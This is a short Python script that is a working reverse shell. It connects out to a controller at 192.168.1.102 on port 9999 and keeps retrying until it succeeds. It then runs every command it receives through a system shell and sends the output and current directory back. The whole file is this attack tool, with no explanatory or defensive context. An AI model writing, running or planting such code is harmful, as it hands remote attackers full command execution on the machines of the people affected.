import subprocess,socket,os

s=socket.socket()

def connect_serv():
	try:
		s.connect(('192.168.1.102',9999))
	except:
		print("reconnecting!!")
		connect_serv()

connect_serv()
while True:
	data = s.recv(20480).decode("utf-8")

	if 'cd' in data[0:2]:
		os.chdir(data[3:])
		s.send(str.encode("directory changed!"))
		continue
	if len(data) > 0:
		cmd = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
		output_byte = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_byte,"utf-8")
		currentWD = os.getcwd() + "> "
		
		s.send(str.encode(output_str+currentWD))
